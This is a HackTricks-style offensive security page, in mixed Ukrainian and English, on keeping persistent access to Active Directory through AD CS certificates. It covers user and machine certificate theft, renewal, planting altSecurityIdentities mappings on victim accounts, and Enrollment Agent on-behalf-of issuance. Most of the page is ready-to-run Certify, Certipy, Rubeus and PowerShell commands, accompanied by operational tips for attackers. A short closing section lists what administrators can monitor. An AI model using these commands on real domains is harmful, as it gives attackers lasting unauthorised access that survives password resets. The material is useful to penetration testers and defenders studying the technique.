# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий підсумок розділів про account persistence з чудового дослідження з [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Розуміння крадіжки Active User Credential за допомогою Certificates – PERSIST1

У сценарії, коли користувач може запросити certificate, що дозволяє domain authentication, attacker має можливість запросити й вкрасти цей certificate, щоб підтримувати persistence у network. За замовчуванням template `User` в Active Directory дозволяє такі запити, хоча іноді це може бути disabled.

Використовуючи [Certify](https://github.com/GhostPack/Certify) або [Certipy](https://github.com/ly4k/Certipy), ви можете знайти enabled templates, що дозволяють client authentication, а потім запросити один:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Сила сертифіката полягає в його здатності автентифікуватися як користувач, якому він належить, незалежно від зміни пароля, доки сертифікат залишається дійсним.

Ви можете конвертувати PEM у PFX і використати його для отримання TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: Combined with other techniques (see THEFT sections), certificate-based auth allows persistent access without touching LSASS and even from non-elevated contexts.

## Отримання Machine Persistence за допомогою Certificates - PERSIST2

Якщо attacker має elevated privileges на host, він може enroll скомпрометований system’s machine account для certificate, використовуючи default `Machine` template. Authentication як machine enables S4U2Self для local services і може забезпечити durable host persistence:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Розширення persistence через Certificate Renewal - PERSIST3

Abusing періоди validity і renewal у certificate templates дає attacker змогу підтримувати long-term access. Якщо у вас є раніше виданий certificate і його private key, ви можете renew його до expiration, щоб отримати новий, long-lived credential без залишення додаткових request artifacts, пов’язаних з original principal.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Відстежуйте терміни дії PFX-файлів, які контролює attacker, і поновлюйте їх завчасно. Renewal також може призвести до того, що оновлені certificates міститимуть modern SID mapping extension, зберігаючи їх придатними за суворіших правил DC mapping (див. наступний розділ).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

If you can write to a target account’s `altSecurityIdentities` attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and, when using strong mapping formats, remains functional under modern DC enforcement.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Потім authenticate with your PFX. Certipy отримає TGT directly:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Побудова надійних `altSecurityIdentities` mappings

На практиці **Issuer+Serial** і **SKI** mappings є найпростішими strong форматами для побудови на основі certificate, що перебуває в руках attacker. Це має значення після **February 11, 2025**, коли DCs за замовчуванням переходять на **Full Enforcement**, і weak mappings перестають бути надійними.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

On **Windows Server 2022+** domain controllers patched with the **September 9, 2025** security update, Microsoft added another strong explicit mapping format that is attractive for persistence because it survives certificate reissuance from the same CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Операційно це відрізняється від старіших strong форматів:
- `Issuer+Serial` прив’язує **один точний certificate**.
- `SKI` / `SHA1-PUKEY` прив’язує **одну keypair**.
- `Issuer/SID` прив’язує **CA, що видає + target SID**, тож renewed або reissued certificates від того ж CA продовжують працювати без переписування `altSecurityIdentities`.

Requirements and caveats
- certificate, presented for logon, must actually contain target account SID у SID security extension.
- Цей формат не допомагає для `ESC9` / `ESC16` style certificates, які omітяють SID extension; у таких випадках повертайтеся до `Issuer+Serial`, `SKI`, або `SHA1-PUKEY`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Скасування сертифіката агента або дозволів шаблону потрібне, щоб видалити цю persistence.

Operational notes
- Сучасні версії `Certipy` підтримують і `-on-behalf-of`, і `-renew`, тож attacker, який має Enrollment Agent PFX, може mint і пізніше renew leaf certificates без повторного доступу до оригінального target account.
- Якщо отримання TGT на основі PKINIT неможливе, отриманий on-behalf-of certificate все одно можна використати для Schannel authentication з `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

Якщо DC не має certificate з підтримкою Smart Card Logon, certificate logon через PKINIT може завершитися помилкою `KDC_ERR_PADATA_TYPE_NOSUPP`. Це **не** знищує primitive persistence: той самий PFX часто все ще можна використати для Schannel-authenticated LDAP access.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Це особливо корисно після PERSIST4/PERSIST5, тому що ви можете продовжувати працювати з Linux/macOS і поєднувати інші дії persistence у directory, наприклад, скидати [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) або редагувати writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: Вплив на persistence

Microsoft KB5014754 запровадив Strong Certificate Mapping Enforcement на domain controllers. Починаючи з **11 лютого 2025**, DC за замовчуванням використовують **Full Enforcement** для weak/ambiguous mappings, а станом на security update від **9 вересня 2025** виправлені DC більше не підтримують старий fallback у Compatibility-mode. Практичні наслідки:

- Сертифікати до 2022 року, які не мають SID mapping extension, можуть не пройти implicit mapping, коли DC працюють у Full Enforcement. Attackers можуть зберігати доступ, або оновлюючи сертифікати через AD CS (щоб отримати SID extension), або створюючи strong explicit mapping у `altSecurityIdentities` (PERSIST4).
- Explicit mappings із strong форматами (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, а на сучасних DC `Issuer/SID`) продовжують працювати. Weak формати (Issuer/Subject, Subject-only, RFC822) можуть бути заблоковані, і їх слід уникати для persistence.
- Якщо weak mappings усе ще, здається, працюють, припускайте, що ви натрапили на unpatched або інакше налаштований DC, а не на надійний long-term persistence path.
- Шляхи видачі типу `ESC9` / `ESC16`, які придушують SID extension, роблять `Issuer/SID` непридатним, тому fallback strong mappings або оновлення через normal template стає практичним варіантом persistence.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
